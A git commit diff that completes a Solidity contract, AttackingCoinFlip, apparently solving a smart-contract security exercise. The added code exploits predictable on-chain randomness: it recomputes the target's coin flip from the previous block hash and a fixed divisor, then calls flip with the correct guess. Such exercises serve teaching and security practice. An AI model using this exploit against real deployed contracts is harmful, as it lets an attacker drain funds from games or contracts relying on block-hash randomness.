6d195d37d7f497efa397605df6537f5b08ce0634
hmfoster <haileyhasmail@gmail.com>
2022-10-11 16:41:13 -0700

    Solve CoinFlip.

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -4,12 +4,18 @@ import "./CoinFlip.sol";
 
 contract AttackingCoinFlip {
     address public contractAddress;
+    CoinFlip public coinFlipContract;
+    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
+        coinFlipContract = CoinFlip(contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+        coinFlipContract.flip(guess);
     }
 }
